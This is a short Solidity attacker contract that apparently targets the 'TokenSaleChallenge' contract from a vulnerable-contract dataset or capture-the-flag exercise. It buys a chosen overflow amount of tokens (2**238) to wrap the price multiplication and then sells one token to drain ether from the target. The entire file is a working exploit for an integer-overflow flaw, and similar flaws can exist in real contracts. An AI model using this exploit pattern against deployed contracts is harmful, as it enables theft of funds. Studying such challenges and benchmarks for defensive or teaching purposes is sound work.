pragma solidity ^0.8.0;

import "../dataset/arithmetic/tokensalechallenge.sol";

contract TokenSaleChallengeAttacker {
    TokenSaleChallenge public target;

    function attack_buy(address _target) public payable {
        target = TokenSaleChallenge(_target);
        uint256 numTokens = 2**238;
        target.buy{value: msg.value}(numTokens);
    }

    function attack_complete(address _target) public payable {
        attack_buy(_target);
        target.sell(1);
    }

    receive() external payable {}

}